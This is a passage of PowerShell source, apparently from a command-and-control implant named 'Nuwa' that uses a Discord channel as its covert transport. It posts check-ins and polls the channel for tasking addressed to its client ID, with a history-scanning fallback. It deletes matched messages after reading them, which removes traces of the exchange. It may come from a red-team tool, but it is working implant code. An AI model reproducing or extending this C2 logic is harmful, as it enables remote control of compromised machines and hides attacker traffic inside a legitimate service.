        # non-tasking request but is still newer than the last tasking poll.
        # A response can be posted after the prior tasking boundary but before
        # the next tasking request begins. Retain that boundary when available,
        # and always cover the bounded response window if state was overwritten
        # by a preceding exchange. Processed message IDs and client-ID matching
        # still prevent replay outside this short window.
        # A task can remain in Discord history longer than the bounded polling
        # cadence while the agent works through empty replies. The fallback
        # therefore scans the channel history only for a response explicitly
        # targeted to this live callback; processed-message suppression avoids
        # replay within the process.
        $taskingFallbackLookback = [DateTimeOffset]::MinValue
        $pendingTaskingMinimumTimestamp = $taskingFallbackLookback
        $previousTaskingRequestStartedAt = $script:NuwaDiscordLastTaskingRequestStartedAt
        if (
            $null -ne $previousTaskingRequestStartedAt -and
            $previousTaskingRequestStartedAt -lt $pendingTaskingMinimumTimestamp
        ) {
            $pendingTaskingMinimumTimestamp = $previousTaskingRequestStartedAt
        } elseif (
            $null -ne $previousRequestStartedAt -and
            $previousRequestStartedAt -lt $pendingTaskingMinimumTimestamp
        ) {
            $pendingTaskingMinimumTimestamp = $previousRequestStartedAt
        }
        $script:NuwaDiscordLastTaskingRequestStartedAt = $requestStartedAt
    }
    $requestMessage = if ($wrapper.Length -gt 1900) {
        Send-NuwaDiscordApiAttachment -Content $wrapper
    } else {
        Send-NuwaDiscordApiJson -Content $wrapper
    }
    $afterMessageId = [string](Get-NuwaDiscordObjectProperty -Object $requestMessage -Name 'id')
    Write-NuwaDebug ("Discord request action {0} after_message_id={1}" -f $ExpectedAction, $afterMessageId)
    $emptyTaskingMatch = $null

    for ($attempt = 0; $attempt -lt [int]$script:NuwaConfig.MessageChecks; $attempt += 1) {
        $messages = @(Get-NuwaDiscordMessages -AfterMessageId $afterMessageId)
        Write-NuwaDebug (
            "Discord poll action={0} attempt={1}/{2} after_message_id={3} message_count={4}" -f
            $ExpectedAction,
            ($attempt + 1),
            [int]$script:NuwaConfig.MessageChecks,
            $afterMessageId,
            $messages.Count
        )
        $alternateClientIds = @()
        if (
            -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.PayloadUUID) -and
            [string]$script:NuwaConfig.PayloadUUID -ne $Uuid
        ) {
            $alternateClientIds += [string]$script:NuwaConfig.PayloadUUID
        }
        $findParameters = @{
            Messages = $messages
            ExpectedClientId = $Uuid
            AlternateClientIds = $alternateClientIds
            ExpectedAction = $ExpectedAction
            ExpectedUuid = $Uuid
            ExpectedRequest = $expectedRequest
        }
        if ([string]::IsNullOrWhiteSpace($afterMessageId)) {
            $findParameters.MinimumTimestamp = $requestStartedAt
        }
        $matched = Find-NuwaDiscordInboundMessage @findParameters
        if (
            -not [string]::IsNullOrWhiteSpace($afterMessageId) -and
            (
                $null -eq $matched -or
                (
                    $ExpectedAction -eq 'get_tasking' -and
                    -not (Test-NuwaDiscordMessageHasTasks -Message $matched -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            )
        ) {
            $pendingMinimumTimestamp = $requestStartedAt
            if ($ExpectedAction -eq 'get_tasking') {
                # Tasking can arrive between polling cycles, so the fallback must
                # scan back to the previous poll boundary without replaying older
                # leftover tasking from the channel history.
                $pendingMinimumTimestamp = $pendingTaskingMinimumTimestamp
            }
            $pendingMessages = @(Get-NuwaDiscordMessages)
            Write-NuwaDebug (
                "Discord fallback action={0} attempt={1}/{2} minimum_timestamp={3:o} message_count={4}" -f
                $ExpectedAction,
                ($attempt + 1),
                [int]$script:NuwaConfig.MessageChecks,
                $pendingMinimumTimestamp,
                $pendingMessages.Count
            )
            $pendingFindParameters = @{
                Messages = $pendingMessages
                ExpectedClientId = $Uuid
                AlternateClientIds = $alternateClientIds
                ExpectedAction = $ExpectedAction
                ExpectedUuid = $Uuid
                MinimumTimestamp = $pendingMinimumTimestamp
                ExpectedRequest = $expectedRequest
            }
            if ($ExpectedAction -eq 'get_tasking') {
                $pendingFindParameters.AlternateClientIds = @()
                $pendingFindParameters.RequireExpectedClientId = $true
            }
            $pendingMatch = Find-NuwaDiscordInboundMessage @pendingFindParameters
            if (
                $null -ne $pendingMatch -and
                (
                    $ExpectedAction -ne 'get_tasking' -or
                    (Test-NuwaDiscordMessageHasTasks -Message $pendingMatch -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            ) {
                $messages = $pendingMessages
                $matched = $pendingMatch
            }
        }
        if ($null -ne $matched) {
            $matchedHasTasks = $true
            if ($ExpectedAction -eq 'get_tasking') {
                $matchedHasTasks = Test-NuwaDiscordMessageHasTasks -Message $matched -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid
            }
            $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'client_id')
            if ([string]::IsNullOrWhiteSpace($matchedClientId)) {
                $matchedClientId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name 'sender_id')
            }
            $matchedMessageId = [string](Get-NuwaDiscordObjectProperty -Object $matched -Name '_discord_message_id')
            Write-NuwaDebug (
                "Discord matched action={0} attempt={1}/{2} message_id={3} target_client_id={4} has_tasks={5}" -f
                $ExpectedAction,
                ($attempt + 1),
                [int]$script:NuwaConfig.MessageChecks,
                $matchedMessageId,
                $matchedClientId,
                $matchedHasTasks
            )
            if (-not $script:NuwaDiscordProcessedMessageIds) {
                $script:NuwaDiscordProcessedMessageIds = @()
            }
            if (
                -not [string]::IsNullOrWhiteSpace([string](Get-NuwaDiscordObjectProperty -Object $matched -Name '_discord_message_id'))
            ) {
                $script:NuwaDiscordProcessedMessageIds += [string](Get-NuwaDiscordObjectProperty -Object $matched -Name '_discord_message_id')
            }
            foreach ($message in $messages) {
                $candidate = ConvertFrom-NuwaDiscordMessage -Message $message
                if (
                    [string]$message.id -and
                    $null -ne $candidate -and
                    [string]$candidate.message -eq [string]$matched.message -and
                    [string]$candidate.sender_id -eq [string]$matched.sender_id
                ) {
                    try {
                        Write-NuwaDebug ("Discord deleting matched message_id={0}" -f ([string]$message.id))
                        Remove-NuwaDiscordMessage -MessageId ([string]$message.id)
                    } catch {
                        Write-NuwaDebug ("Discord delete failed for message_id={0}: {1}" -f ([string]$message.id), $_.Exception.Message)
                    }
                    break
                }
            }
            if ($ExpectedAction -eq 'get_tasking' -and -not $matchedHasTasks) {
                $emptyTaskingMatch = $matched
                Write-NuwaDebug (
                    "Discord matched empty get_tasking action on attempt={0}/{1}" -f
                    ($attempt + 1),
                    [int]$script:NuwaConfig.MessageChecks
                )
                if ($attempt + 1 -lt [int]$script:NuwaConfig.MessageChecks) {
                    Start-Sleep -Seconds ([int]$script:NuwaConfig.TimeBetweenChecks)
                    continue
                }
            }
            if (
                -not [string]::IsNullOrWhiteSpace([string](Get-NuwaDiscordObjectProperty -Object $matched -Name '_nuwa_wire_body'))
            ) {
                return [string](Get-NuwaDiscordObjectProperty -Object $matched -Name '_nuwa_wire_body')
            }
            return [string]$matched.message
        }
        if ($attempt + 1 -lt [int]$script:NuwaConfig.MessageChecks) {
            Start-Sleep -Seconds ([int]$script:NuwaConfig.TimeBetweenChecks)
        }
    }

    if ($null -ne $emptyTaskingMatch) {
        if (
            -not [string]::IsNullOrWhiteSpace([string](Get-NuwaDiscordObjectProperty -Object $emptyTaskingMatch -Name '_nuwa_wire_body'))
        ) {
            return [string](Get-NuwaDiscordObjectProperty -Object $emptyTaskingMatch -Name '_nuwa_wire_body')
        }
        return [string]$emptyTaskingMatch.message
    }

    return $null
}

function Invoke-NuwaTransport {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [string]$Action,

        [Parameter(Mandatory = $true)]
        [string]$WireBody
    )

    Write-NuwaDebug ("Discord transport action {0} for {1}" -f $Action, $Uuid)
    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody
    return Invoke-NuwaDiscordRequest `
        -TransportBody $body `
        -WireBody $WireBody `
        -Uuid $Uuid `
        -ExpectedAction $Action
}
